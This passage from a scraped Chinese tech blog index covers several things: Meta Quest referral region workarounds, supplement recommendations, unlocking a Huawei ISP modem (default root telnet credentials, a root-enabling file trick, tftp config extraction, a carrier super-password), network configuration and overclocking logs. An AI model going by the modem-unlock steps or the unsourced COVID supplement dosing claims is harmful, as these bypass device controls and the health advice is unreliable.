TIP2：如果小蓝条消失了，可以退出登录之后换之前用的节点在登陆，可能小紫条就又跑出来了。暂时不清楚这个机制是什么，最核心的还是不要更换 IP。 建议阅读后文后再做尝试！ 建议阅读后文后再做尝试！ 建议阅读后文后再做尝试！ 关于领取不到的问题首先是账号地区问题，如果创立时用的其他地区的，就会提示下面等类似的提示。要是有这个提示就别折腾了，你的账号在一开始就已经是非活动地区了，需要你重新创建一个账户，和用的机场一点关系都没有。 unavailable in your area oculus referrals are currently unavailable in your area. 如果确定地区正确的话，登录官方的推荐网址是这样显示的 接受者领取成功是这样一个提示 如下图是账号已经被送去其他区域的例子，同样的网络环境下打开同样的邀请链接显示不同的内容 （2023-11更新）现在 Q3 出了之后界面变成这样了 接下来就是要用到这个新注册的账户登录手机上的 Meta Quest 软件，然后头显恢复出厂，用这个账户配对，配对成功之后就能在 设置 -&gt; 支付方式 看到有可用的礼金了。 注意：注册时和登录时需要全程挂和车头同样区域的，具体自测 可用地区 Japan, Spain, Switzerland, Norway, Belgium, Netherlands, France, Taiwan, Finland, New Zealand, U.S. ,Australia, Austria, Canada, Denmark, Iceland, Ireland, Italy, Poland, United Kingdom, South Korea, and Sweden. 我用的台湾的节点（此节点已被送中，但实际 IP 地理位置在台湾），全程挂着正常注册，之后手机上的 APP 中的 Menu 菜单能显示蓝色的 banner，就算成功了。 悲，我和我朋友的设备前任机主都领过了，嫖不到哩。 关于节点地区的问题主要有四种节点类型 第一种 添加手机号提示技术错误 IP不干净 第二种 出邀请链接 不出钱包 IP是对应地区的 但是具体位置被送中 第三种 出钱包 不出邀请链接 说明IP是干净的，但是IP的实际位置不在活动区域 第四种 也是最完美的 钱包和邀请链接都会出现。IP和实际位置相符合，没有被标记，也就是土著环境 其中第一种可以和第二种和第三种相叠加，也可能是 IDC 的 IP 段不行，Meta 为了防止短信轰炸所以不让发短信。 所以想要出现推荐链接的话只要第二种和第四种环境即可。 具体测试过程通过查询经纬度判断 Meta 数据库中 IP 标记所在地区打开 https://auth.meta.com/settings/vyi/ 倒数第二项 安全与登录信息 如果节点没有被送中的话（IP实际位置和标记位置相同），手机端会显示钱包，也就是这个 IP 标记位置没有被污染，如果被污染了就不会显示钱包了。 发现机场很多节点被送中，之前注册的日区号也显示成中国了 使用日区注册的账户和日区节点会话里显示 Windows 电脑 · Inzai-shi, Chiba, Japan 但在日区节点下用台区账户重新登录之后显示 说明邀请是跟随当前账户所注册的地区的。 2023-11-12 测试 成功领取到礼金使用 中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.21 注册 账户不出钱包，出小蓝条。 标记位置在上海 纬度：31.176，经度：121.504：这个位置位于中国上海市的某个地方。 测试打开邀请链接正常 作为礼物购买测试 输入邮箱后赠送，绑卡支付即可 接收方通过收到的兑换码在商城成功兑换。 2023-11-15 小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。 开发者模式https://dashboard.oculus.com/organizations/create/ 同样的，如果开发者模式要求开 2FA 有奇怪的问题，最终还是你的节点问题，我用下面说的节点成功添加了 GV 的手机号码。 可添加手机号节点切换节点后需要登入登出两次才生效 中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.55 香港 油尖旺御金·国峯 環球全域電訊 C08 東京 上海移動 測試 猜测是 Meta 为了防止短信轰炸限制了一部分 IP 添加手机号。 顺利开启开发者模式。 总结Meta 和 Facebook 一样，检测地区比较恶心。会把账号的地区锁住，导致没法用一些功能，之后使用要特别注意，不要切换节点的地区了。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"VR","slug":"VR","permalink":"https://blog.irec.moe/tags/VR/"}]},{"title":"iHerb 初体验","slug":"生活/20230819_iHerb下单体验/iHerb 下单体验","date":"2023-08-19T04:00:00.000Z","updated":"2023-08-25T14:40:50.000Z","comments":true,"path":"/iherb.html","permalink":"https://blog.irec.moe/iherb.html","excerpt":"","text":"经群友介绍了解到了 NAC 和南非醉茄之类的 保健品。 [Boom快讯] 8月17日开始 Iherb 全场 7.5折 满299元85折，499元75折 折扣码：7XBUY活动时间：8.17-8.24（北京时间凌晨1点） 不限制使用次数～ 由于最近二阳大爆发 , 所以推荐大家一些和 COVID有关的产品 ….之前发了链接 , 然而群友们表示完全不懂 , 要我介绍一下…我也只能结合自己学到的以及”人体爆炸实验”的亲身感受简单的做介绍…毕竟是野鸡大学毕业不是医科大学… 首先 , 最有用的 , 就是 NAC , 国内属于处方药叫 乙酰半胱氨酸 .平时作为护肝保健的用量为 600mg , 1天 …COVID 感染后用量 加到 600mg X 3 , 可以有效防止COVID引起的各类并发症 …早在原始毒株的时候 欧洲的专家就用 雾化吸入NAC的方式给重症病人保命…然而国内铺天盖地的”莲花清瘟” 完全覆盖了真正有用的药品 …NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭…. 接下来是 维生素 D3+K2…具体看一下B呼 :https://zhuanlan.zhihu.com/p/415774012 ———————————————————————— 最后…因为这里有大量服用喹硫平的人 …再推荐一个南非醉茄 :https://cn.iherb.com/pr/emerald-laboratories-elevated-mood-with-affron-saffron-extract-60-vegetable-caps/116437家里老年人每天晚上做噩梦 , 像武打片一样 , 吃了这个睡的香的1B … 再也没有从床上掉到地上过…同样也适用于平时情绪紧张…容易生气的人 … 自己近期情绪不稳定，经常失眠，白天没劲，靠运动弥补好了一点，但不明显。遂准备购入一些，希望不是 placebo。 查了查资料应该是有效果的，遂小购入一点试试看，价格还能接受。 以下是介绍NAC（乙酰半胱氨酸）NAC，国内属于处方药叫 乙酰半胱氨酸 可作为护肝保健品，每天600mg * 1。 感染 COVID 后用量加到 600mg X 3 , 可以有效防止 COVID 引起的各类并发症。 NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭…. 注意事项参照其他资料，建议刚开始小剂量开始尝试。 维生素 D3 + K2https://zhuanlan.zhihu.com/p/415774012 提高血清维生素D含量，会影响冠状病毒COVID-19患者的死亡率。 各地区有色人种血清维生素D的缺乏率在69.2%~82.5%。 作者表示，高度缺乏维生素D 的原因，除了现代化的办公室生活方式（家-汽车-办公室-汽车-家），还和纬度、皮肤色素沉着程度、季节和膳食摄入量（鱼肉、动物肝脏、发酵食品等）有重要关系，而口服维生素D3是预防不足最简单有效的方式。 针对口服D3过量，可能会导致的高钙血症、肾结石等情况，可以通过补充K2来调节，K2羧化可以激活含有γ-羧基谷氨酸的蛋白质（骨钙素），活化的骨钙素将钙沉淀在骨骼中，而非活化的骨骼素会抑制骨骼对钙的吸收。 所以当血清维生素D较高，增加骨钙素合成率时，就需要K2作为拮抗剂，来避免血管硬化、钙化。 另外考虑到代谢维生素D的酶都需要镁，所以作者强烈建议考虑同时摄入K2和镁。 南非醉茄https://zhuanlan.zhihu.com/p/347454352 有 KSM-66 和 Sensoril 两种 Sensoril和KSM-66的区别: “Sensoril® ashwagandha powder also contains a greater total concentration of biologically active constituents, containing 10% (or greater) withanolides; KSM-66 ashwagandha powder is standardized to contain 5% (or greater) withanolides and doesn’t include any ashwagandha leaf constituents.” 也就是说Sensoril的醉茄内酯含量是同量KSM-66的两倍。并且含有醉茄叶提取物。 效果来说： “Anecdotally, most people report that Sensoril is the better “nighttime” ashwagandha supplement, while KSM-66 is superior for daytime use and stimulating cognitive function. For stress relief and general well-being, both will do just fine.” KSM-66对提高白天专注度更有效，Sensoril对提高睡眠质量更有效。降压效果来说是类似的。 我是选择的后者，群友也推荐后者。 下单作业在 iHerb 购入，有7夕活动，优惠码 7XBUY 。到8月23日失效。 我就购入了这三款，具体功用上文有介绍 https://www.iherb.com/pr/source-naturals-n-acetyl-cysteine-600-mg-120-tablets/1291 https://www.iherb.com/pr/life-extension-optimized-ashwagandha-60-vegetarian-capsules/16416 https://www.iherb.com/pr/now-foods-mega-d-3-mk-7-180-mcg-5-000-iu-60-veg-capsules/79866 当然也可以选其他品牌的，记得看 D3 K2 含量，有些比较低。 当天下单，次日就已经发货了。 下单的时候可以用我的优惠码 JIV1863 ，再用商城自带的优惠码，可以享受到优惠的同时我也吃到 AFF。你也可以注册一个小号互相刷 AFF，购物可以折抵。 据说还有一个大绿胶囊，不过不能夏天买，等这一阵过去再考虑购入否。 品牌选购见群友总结的攻略 -&#x3D;爆炸实验&#x3D;- 第二季第3集 - 52个常见抗衰补充剂品牌TierList v2.1 TierList 用在最多的地方…就是Youtube上的原P(roducer). 我把它切换成长方形图标正好可以用来放各大品牌的LOGO .前几天…在玩B站的时候我得知了这世界上有很多强迫症患者 , 于是我又花了1个多小时把这50个Logo居中并调整到了合适的大小.https://tiermaker.com/list/health-fitness/regular-anti-aging-supplement-brands-tier-list-15706019/2904562 以上品牌Ranking结合了美国ConsumerLab的评价 , 自身体验 , 群友介绍 , 以及花费大量时间的综合资料查询…所有的品牌均可通过以下3大正规官方授权渠道很方便的买到: Amazon自营 , 京东国际自营或官方旗舰店 , iherb .淘宝或者京东亚马逊第三方是千万不能买的 , 几年前朋友就买到过面粉丸子做的假GNC褪黑素了…美国英国市场上那堆假NMN也出自于中国…全球三大造假大国 : 中国印度韩国 , China No.1 !因此确保渠道正规之后 , 接下来才是考虑品牌的问题 … 至于这些品牌具体怎么样 , 您需要付费57美元一年订阅 : https://www.consumerlab.com/这是全球最公正的补充剂第三方实验室…9年前它来中国推广过, 然而中国人民可能觉得57美元用来去东莞保健效果比看这种文章效果更好点… 接下来频道中将上传整个Consumerlab打包后的115份付费测评结果~ 待更新…","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"续命","slug":"续命","permalink":"https://blog.irec.moe/tags/%E7%BB%AD%E5%91%BD/"},{"name":"保健","slug":"保健","permalink":"https://blog.irec.moe/tags/%E4%BF%9D%E5%81%A5/"}]},{"title":"更换 HS1845X6 光猫并且使用 EasyMesh 进行组网的记录","slug":"硬件/20230808_更换光猫/HS1845X6 折腾记录","date":"2023-08-11T12:00:00.000Z","updated":"2023-08-19T07:24:30.000Z","comments":true,"path":"/fuck_chinamobile.html","permalink":"https://blog.irec.moe/fuck_chinamobile.html","excerpt":"","text":"设备情况湖南电信EPON版本的 HS8145X6 设备类型: Epon 生产厂家: 华为 设备型号: HS8145X6 设备标识号: 1413FB-408411413FB8D7959 硬件版本: 210D.A 软件版本: V5.21.C00S050 普通的超密无法进入，重置需要管理员密码 尝试使用论坛大佬制作的 R20 开 TELNET 工具。 telnet 无效，遂放弃。 其实这种是有办法破解的，是使用上述提到的使能工具，能让光猫直接执行相关的命令，比如说获取里面的配置文件，tftp 传到电脑上然后解密即可。 我是找咸鱼 hwont 大佬，他在我电脑上用使能工具然后传回来一个文件，他拉回去解密然后给我，5分钟搞定，当然文件他是不会给的，有兴趣的话可以自行研究。如果菊花把这个使能工具封禁了或者需要相关授权才能用的话，咸鱼上的配置光猫的会倒一片。 具体步骤改华为界面首先去 192.168.1.1:8080 使用超密登录进去，把 TELNET 防火墙允许，没有补全的照常补全，这里因为我已经补全过了所以说不需要在此补全了。 PS：echo20_Telnet_Shell.bin 这个文件是自带开 telnet 功能的，可以用 HWFW 解包打开，提取出来 EFS 看看就知道了，稍微懂一点 Linux 的也能依葫芦画瓢做出来一些东西的。 123456789telnet 192.168.1.1 root adminHW su shell cd /mnt/jffs2 tftp -pl hw_boardinfo 192.168.1.10 // 传回电脑 tftp -gr hw_boardinfo 192.168.1.10 // 传回光猫 cp hw_boardinfo hw_boardinfo.bak // 复制一份 使用 tftp 传回 hw_boardinfo ，用 HW Dollar 打开，1a,1b 改 COMMON，如图所示 之后再传回光猫，重启即可，再次进入网关界面就会变成华为界面了。 配置ONT认证及上网参数首先要修改认证方式和 SN，配置好上网参数。 注：我所在区域只认证光猫SN，以及用的光猫都没有 LOID 选项。有一次改了一个友华光猫换地区之后出现 LOID，结果在电信宽带上认证不过，其他猫改LOID 和 PASSWORD 是可以的，基本确定我这边光猫固件锁死模式了。都是些二线厂商的猫。 我这里是湖南郴州移动的参数，不同地市VID都不同，仅供参考。 然后修改一下 DHCP 服务器，无缝替换到原来的设备上。 拆机&amp;上机 实测效果正常认证以及成功拨号，可以看到 BRAS 是 ME60，并且 IPV6 前缀拿到 &#x2F;60。 FullCone NAT 和 K662d 正常 Mesh 组网 这里我没有关闭 Wi-Fi覆盖业务(修改后，重启生效)，我觉得原帖说的可能是老版本系统有 BUG 导致的。 碰到的一些问题问题1：IPV6 禁止入站其实在电信界面是有关闭 IPV6 防火墙的设置的，不过在华为界面就没看到了。 第一种方法 telnet 修改文件（不推荐） 使用解密工具解密后，搜索 X_HW_IPv6FWDFireWallEnable 把 1 改成 0，保存加密导入回去重启即可。 注意如果提示 tftp: can’t open ‘hw_ctree.xml’: Permission denied 则需要获取 root 权限，步骤如下 12345touch /mnt/jffs2/Equip.sh //开启root权限 reboot //重启 继续你的上传操作 rm /mnt/jffs2/Equip.sh //关闭root权限! reboot //重启 我用这种方法修改文件之后 WiFi 消失，设置界面中 WiFi 设置一片空白 第二种方法 适用于华为公版界面，直接导出修改即可 我用的第二种方法，改好之后上传还原即可。 测试OK PT 正常，IPV4 甚至有入站连接。 问题2：DHCP失效如果恢复出厂设置之后或者备份还原 hw_boardinfo 文件出现拿不到 IP 的情况，可以手动开关一下 DHCP 服务器，可以解决。 一些小Tips1、华为界面恢复出厂设置之后，PON模式会变为原来的，但修改的 GPON SN 不会变，同时恢复出厂不掉的超级密码也会被替换成电信默认的nE7jA%5m 待补充… 总结用下来还是挺不错的，总花费不算人工费55+100，我家因为户型原因这俩也够全覆盖了。华为固件的 FullCone NAT 也挺好用，局端设备都能 NAT1，总之性价比拉满。唯一缺点是固件不自带限速功能，其他功能还是挺强大的。 参考资料：https://www.right.com.cn/forum/thread-8147423-1-1.html https://www.chinadsl.net/thread-168378-1-1.html https://www.chinadsl.net/forum.php?mod=viewthread&amp;tid=168309&amp;extra= https://www.right.com.cn/forum/thread-4091764-1-1.html 所用到的工具：网盘链接 账号：ont 密码：ont12345","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"}]},{"title":"在 RTL 网卡上启用 Wireshark VLAN 抓包功能","slug":"网络/20230721_Wireshark 在 RTL 网卡上启用 VLAN 抓包功能/Wireshark 在 RTL 网卡上启用 VLAN 抓包功能","date":"2023-07-21T12:00:00.000Z","updated":"2023-08-19T04:15:37.000Z","comments":true,"path":"/wireshark_vlan_enable.html","permalink":"https://blog.irec.moe/wireshark_vlan_enable.html","excerpt":"","text":"在 RTL 网卡上启用 Wireshark VLAN 抓包功能平台网卡：Thinkbook 14+ 6800H 自带 RTL8168 网卡 驱动版本：10.65.421.2023 WireShark版本：v4.0.7-0-g0ad1823cc090 1、查看驱动注册表位置详细信息 - 属性 -&gt; 驱动程序关键字，如下图。找到最后结尾那个数字，比如我这里是0001 2、修改注册表找到之后 Win + R 输入 regedit 打开注册表。 然后定位到 1HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class{4D36E972-E325-11CE-BFC1-08002bE10318}\\0001 注意这里末尾的数字根据你上一步找到的修改相应的数值。 进去之后只需要把预先存在的 MonitorModeEnabled 的值改为1即可，其他都不用动，我实测成功！ 3、修改 Wireshark 设置右击列标，选择首选项 点击右下角的+，输入标题，选择类型之后拖动到合适的位置即可。 4、测试通常情况下接到交换机的 Trunk 口就能接收到绝大部分的 VLAN 包了（交换机上设置 ALLOW VLAN ALL）。 由于没有网管交换机，这是我通过路由器的 IPTV 功能来模拟的，路由器上设置了 IPTV 口，路由器会在 WAN 口上打上对应的标签发送出去，这样我就能从 WAN 口上接收到打上 VLAN 标签（路由器上 IPTV 口）的数据包了。 Enjoy！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"WireShark","slug":"WireShark","permalink":"https://blog.irec.moe/tags/WireShark/"},{"name":"经验","slug":"经验","permalink":"https://blog.irec.moe/tags/%E7%BB%8F%E9%AA%8C/"}]},{"title":"在 OpenWrt 下使用 WireGuard 实现全局代理上网","slug":"网络/20230622_OpenWrt WireGuard 实现全局代理上网/在 OpenWrt 下使用 WireGuard 实现全局代理上网","date":"2023-06-22T12:00:00.000Z","updated":"2023-08-19T04:16:00.000Z","comments":true,"path":"/openwrt_with_wireguard_proxy.html","permalink":"https://blog.irec.moe/openwrt_with_wireguard_proxy.html","excerpt":"","text":"在 OpenWrt 下使用 WireGuard 实现全局代理上网设备情况设备型号：360 T7 固件版本号：ImmortalWrt 18.06-5.4-SNAPSHOT r11814-ef0c86bdb0 &#x2F; LuCI branch (git-22.323.17670-f9380b5) 网络架构图如下 网络设置新建 WG 接口，修改协议为 WireGuard VPN 一般配置里填好私钥（可以自行生成），IP地址（对端的允许的IP） Peers 里添加一个新的。 然后填写对端的公钥，允许的IP话，看情况填写。 如果只需要走部分网段的话（打通内网），填写对应的网段即可（CIDR格式），例如192.168.88.0&#x2F;24, 10.22.33.128&#x2F;25。点加号可以添加多条。 如果需要全局代理的话，填写0.0.0.0&#x2F;0（默认路由）即可 路由允许的 IP 打钩，这一条是自动添加路由表的作用。 端点主机和端点端口填写对端的IP地址和端口即可。 持续 Keep-Alive 看情况填写，我使用的是默认值0。 填写好是这样的： 到这一步，如果只需要走部分网段的设置已经接近尾声了，把新建的 WG 接口加入到和 LAN 相同的防火墙区域，即可打通。或者新建一个新区域，配置规则也行，保存应用之后重连一下端口，就可以在 状态 - WireGuard 状态 看到链接信息了，有正常收发流量即为正常。 全局代理设置对于这个在网上相关的资料非常少（也许是我想实现的效果比较扭曲），我到最后发现会自动给我添加 WAN 口的默认路由，导致走不下去，手动添加配置删除路由还是不太稳定，所以放弃。最近有了新发现，是 MWAN 搞的鬼。 现在开始配置教程。 防火墙设置在防火墙区域新建一个 VPN 区域，把 IP 动态伪装打开（相当于在主路由那边是通过这台路由器 NAT 之后通信），再把 WG 接口添加到 VPN 区域。 修改 VPN 区域的设置： ​ 允许转发到目标区域：WAN 区域打钩 ​ 允许来自源区域的转发： LAN 区域打钩 修改 WAN 区域的设置： ​ 允许转发到目标区域：空 ​ **允许来自源区域的转发：**VPN 区域打钩 修改 LAN 区域的设置： ​ 允许转发到目标区域：VPN 区域打钩 ​ **允许来自源区域的转发：**空 修改好应该是这样的 防火墙 LAN WAN VPN 到此防火墙设置结束。 接口设置WAN接口 -&gt; 高级设置 -&gt; 使用默认网关 去掉对钩 LAN接口 -&gt; 基本设置 -&gt; 使用自定义的 DNS 服务器 -&gt; 填写 WG 那边的网关，或者公共 DNS 路由设置网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由 接口选择 WAN ，对象填写对端 WG 的 IP 地址，IPv4 子网掩码32位，IPv4 网关填写你 WAN 口上级路由器的网关地址，其他保持默认即可。 网络 -&gt; 静态路由 -&gt; 静态 IPv4 路由 网络 -&gt; 负载均衡（MWAN） -&gt; 禁用所有 MWAN 接口 就是因为这个原因，所以他才会自动给我加路由表，明明我取消了使用默认网关，并且没有添加其他的路由项，还是会给我加默认路由，情况如下图。 关闭 MWAN 后 测试联通性 Enjoy！ 更换固件后测试固件版本号：QWRT R23.6.1 &#x2F; LuCI Master (git-23.141.16773-28dd4b3) 这个固件防火墙区域都不用配置，WAN也不用取消默认网关，默认即可上网（自动给添加了路由）。 默认路由表 配置好 WG 后的路由表 大雕NB！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"https://blog.irec.moe/tags/OpenWrt/"},{"name":"WireGuard","slug":"WireGuard","permalink":"https://blog.irec.moe/tags/WireGuard/"}]},{"title":"在 OpenClash 代理环境下 Windows 提示无 Internet","slug":"网络/20230622_OpenClash 无 Internet/20230622_OpenClash 无 Internet","date":"2023-06-22T12:00:00.000Z","updated":"2023-08-19T04:15:48.000Z","comments":true,"path":"/openclash_windows_nointernet.html","permalink":"https://blog.irec.moe/openclash_windows_nointernet.html","excerpt":"","text":"在软路由上用了一段时间 OpenClash，由于我是自己写的规则，所以在很多地方都不完整，中途遇到多多少少的bug。 由于碰到这个无 Internet 的问题，导致某些微软服务登不上，有点烦人。所以折腾了一段时间，有了这样几种解决办法。 第一种方法 - 让域名走代理在这个地方也有讨论下，我是这样解决的。 同样是 FAKE-IP 模式，今天为了这问题折腾一天，最后发现是因为 OpenClash 的 DNS 代理解析出的 IP ，我本地访问会直接被 RESET，而我用本地网络环境解析到的 DNS 却可以正常访问。还碰到一个坑是某些代理商会屏蔽 www.msftconnecttest.com ，具体表现和上述一样。最后我单独改了规则，让他走微软服务，然后微软服务再单独走不屏蔽的节点，完美解决。其实还有其他解决办法，比如说让这个域名单独走本地DNS解析，我觉得这样简单省事就懒得弄了。实测并不是IP段的问题，我还是默认的198.18.0.1&#x2F;16段。 另外一种方法 - 过滤域名请求这段配置是我从其他地方抄过来的，实测可用，记得把前面一种方法提到的 www.msftconnecttest.com 改一下规则，让他不走代理即可。这种方法比上面的方法更简单省事。 1234567891011dns: fake-ip-filter: - &#39;*.lan&#39; - localhost.ptlogin2.qq.com - &#39;+.srv.nintendo.net&#39; - &#39;+.stun.playstation.net&#39; - &#39;+.msftconnecttest.com&#39; - &#39;+.msftncsi.com&#39; - &#39;+.xboxlive.com&#39; - &#39;msftconnecttest.com&#39; - &#39;xbox.*.microsoft.com&#39; 这一段的主要作用就是让 OpenClash 不解析在列表内的域名，直接返回源 IP 地址，这样获取到的 IP 就不会是 198.18.0.0&#x2F;16了。 Enjoy！","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"OpenClash","slug":"OpenClash","permalink":"https://blog.irec.moe/tags/OpenClash/"}]},{"title":"自用 PC 机的折腾记录","slug":"硬件/20230618_个人13700K+3080折腾记录/13700K_3080折腾记录","date":"2023-06-18T04:00:00.000Z","updated":"2023-12-20T06:48:14.000Z","comments":true,"path":"/my_pc.html","permalink":"https://blog.irec.moe/my_pc.html","excerpt":"","text":"配置如下 CPU: Intel Core i7-13700K Base Clock P Core 5.3GHz@1.34V E Core 4.2GHz@1.34V Current: 关闭 HT + VRM LLC Mode 8 + CPU LiteLoad Mode 1 CPU Cooler: VALKYRIE C360-RGB CPU Thermal Paste: Shinetsu X-23-7921-5 RAM: OLOy 战鹰白金特别版 RGB 3600MHz 16GB x2 Motherboard: MSI PRO-Z690-A-WIFI-DDR4 BIOS: 7D25v1C GPU: 盈通 RTX3080 10G 花嫁 0.8V@1710MHz Case: DIY Rack OS: Windows 10 BIOS常规设置OC -&gt; Advanced CPU Configuration BCLK 100MHz Lock On 开 HT 关 CPU Over Temp Protection 110°C TVB 相关全关 IA CEP Support 关 功耗相关设置在设置散热器的时候BIOS自动帮你调整了，这里就不手动调了。 GPU降压照泥潭大佬的教程，摸出下面的表，照着配置即可，最终结果 0.8V@1710MHz。 Voltage Freq Result 0.8 1830 X 1815 X 1800 X 1785 X 1740 X 1710 CURRENT 0.825 1875 X 1830 X 1800 X 3DM 不过 IMC首先摸IMC体质，SA 电压1.4起摸，内存用 XMP 2 4400MHz 18-26-26-46 @ 1.55V。 烧机工具使用 yc 0 1 8 16。 Freq SA result Passed 4400MHz 1.45 不开机 4300MHz 1.45 进系统 -&gt; yc 秒重启 4266MHz 1.45 进系统 -&gt; yc 38s报错 4266MHz 1.40 进系统 -&gt; yc 秒报错 -&gt; 蓝屏 4266MHz 1.50 进系统 -&gt; yc 秒报错 4200MHz 1.40 进系统 -&gt; yc 15it Passed YES 4200MHz 1.37 进系统 -&gt; yc 20it Passed YES 4200MHz 1.36 进系统 -&gt; yc 2it 报错 4200MHz 1.35 进系统 -&gt; yc 1it 报错 4133MHz 1.30 进系统 -&gt; yc 5it Passed YES 4133MHz 1.275 进系统 -&gt; yc 5it Passed YES 4133MHz 1.26 进系统 -&gt; yc 15it Passed YES 4133MHz 1.255 进系统 -&gt; yc 5it Passed 4133MHz 1.25 进系统 -&gt; yc 1min 报错 4133MHz 1.20 进系统 -&gt; 蓝屏 4100MHz 1.24 进系统 -&gt; yc 15it Passed YES 4100MHz 1.23 进系统 -&gt; yc 7it 报错 4100MHz 1.22 进系统 -&gt; yc 2min 报错 4100MHz 1.20 进系统 -&gt; yc 秒报错 4000MHz 1.15 进系统 -&gt; yc 60it Passed YES 4000MHz 1.14 进系统 -&gt; yc 5it 报错 4000MHz 1.12 进系统 -&gt; yc 秒报错 4000MHz 1.10 进系统 -&gt; 蓝屏 实测开关 HT 对 IMC 体质无影响，该不开机的还是不开机 Freq SA Voltage result Passed 4400MHz 1.45 不开机 4300MHz 1.45 进系统 -&gt; yc 秒报错 4266MHz 1.45 进系统 -&gt; yc 20s报错 结果通过上面的测试结果我们可以找到这几组数据 Freq SA Voltage result Passed 4200MHz 1.37 进系统 -&gt; yc 20it Passed YES 4133MHz 1.26 进系统 -&gt; yc 15it Passed YES 4100MHz 1.24 进系统 -&gt; yc 15it Passed YES 4000MHz 1.15 进系统 -&gt; yc 60it Passed YES 最终我选择了4133MHz@1.28V，电压按习惯多给0.02防止缩肛不稳定。为什么没选择4200Mhz是因为我觉得0.1V的电压提升67MHz不太值，仅此而已。 CPU超频首先是上文调整好IMC后的测试结果。 CPU-Z 单核876.5分，多核10646.1分 R23 多核25205分。 AIDA64 内存测试结果： AIDA64 FPU：温度95度浮动，P Core 最热 97°C，E Core 最热 87°C 。功耗235W，软显电压1.344V P95 Small FFTs：温度103度浮动，P Core 最热 105°C，E Core 最热 93°C 。功耗270W，软显电压1.300V 对于超频我有两种选择，一种是全核固定频率，一种是动态超频。在此我对两种结果都测试一下。此外还有一种是通过调整 VID 相关 + offset 实现对原有电压曲线进行调整，同时对不同的负载核数动态调整频率。现在网上比较主流的是后面那一种。 固定电压模式有一个缺点就是CPU电压不能下探到1V以下，导致待机功耗偏高，30W左右。 超频我所预想的结果是CPU不撞110°C温度墙，在此基础上尽可能达到单核更高频率并且稳定运行，不能出现不稳定情况。 定压定频超频首先CPU定频1.3V，防掉压设置Mode3。5.6GHz开始起摸。 5.6GHz 电压 P95 CPU-Z R23 FPU remark 1.30V 报错 916&#x2F;11093 94°C&#x2F;233W 1.35V 报错 918&#x2F;11093 26186 1.35V 撞墙 918&#x2F;11086 Mode2 1.30V 掉线程 Mode2 1.32V 掉线程 Mode2 1.33V 撞墙110°C&#x2F;282W&#x2F;490W&#x2F;1.324V 914&#x2F;11116 26137&#x2F;204W&#x2F;1.326V 93°C&#x2F;226W&#x2F;381W&#x2F;1.326V 1.34V 撞墙 Mode2 1.35V 撞墙 Mode2 放弃5.6GHz。 5.5GHz 电压 P95 CPU-Z R23 FPU remark 1.33V 108°C&#x2F;305W&#x2F;1.292V 1.32V 107°C&#x2F;285W&#x2F;1.286V 1.31V 104°C&#x2F;277W&#x2F;507W&#x2F;1.276V 898&#x2F;10983 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.30V 闪退101°C&#x2F;250W&#x2F;1.268V 897&#x2F;10987 25830&#x2F;182W&#x2F;1.278V 1.29V 闪退+死机 1.28V 死机98°C&#x2F;240W&#x2F;1.248V 1.28V 103°C&#x2F;270W&#x2F;483W&#x2F;1.274V 897&#x2F;10979 25877&#x2F;182W&#x2F;1.276V 85°C&#x2F;202W&#x2F;345W&#x2F;1.276V Mode2 1.27V 9min闪退100°C&#x2F;265W&#x2F;462W&#x2F;1.266V 899&#x2F;10978 25919&#x2F;177W&#x2F;1.266V Mode2 1.26V 10min闪退97°C&#x2F;260W&#x2F;457W&#x2F;1.256V Mode2 1.25V 闪退 Mode2 个人觉得Mode2获得的电压比较平一点，所以倾向于使用这个。 在此基础上拿出这两组数据，作为定频定压超频最终结果。我最终选的的是第二组数据使用，电压为了考虑稳定性必须要多给0.03V。 Vcore LLC P95 CPU-Z R23 FPU remark 1.31V Mode3 104°C&#x2F;277W&#x2F;507W&#x2F;1.276V 898&#x2F;10983 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.28V Mode2 103°C&#x2F;270W&#x2F;483W&#x2F;1.274V 897&#x2F;10979 25877&#x2F;182W&#x2F;1.276V 85°C&#x2F;202W&#x2F;345W&#x2F;1.276V 最终结果 参数 P95 CPU-Z R23 FPU remark 5.5Ghz@1.29V LLC Mode 2 105°C&#x2F;270W&#x2F;492W&#x2F;1.282V 901&#x2F;10953 25927&#x2F;186W&#x2F;1.284V 89°C&#x2F;208W&#x2F;350W&#x2F;1.284V 玩原神会闪退&#x2F;TM5不过 5.5Ghz@1.34V LLC Mode 3 掉线程降频&#x2F;300W&#x2F;518W&#x2F;1.300V 讲真的，我是真的不想用这个电压，甚至想降压摸 AC LL 去了，这我都给了110°C的功耗墙，已经顶着墙跑了。 网友说一般跑R23测试，那我就跑吧。 依然是 Mode 3 防掉压，电压0.01V一档，找到稳定跑10min不报错的点，跑稳之后再试试（据说对13代）压力更大的R15。 结果因为我是 Win10 跑不了，作罢。 电压 R23 FPU remark 1.31V 25928&#x2F;183W&#x2F;1.288V 86°C&#x2F;208W&#x2F;350W&#x2F;1.284V 1.30V 25830&#x2F;182W&#x2F;1.278V 1.29V 185W&#x2F;312W1.266V 1.28V 第三圈报错 1.27V 自动关机 1.25V 报错 然后想了想，折腾这么久就为了0.2GHz，而且还不稳定，所以作罢，尝试降压。 降压按大佬所说的，先摸防掉压开多少合适，然后降低AC 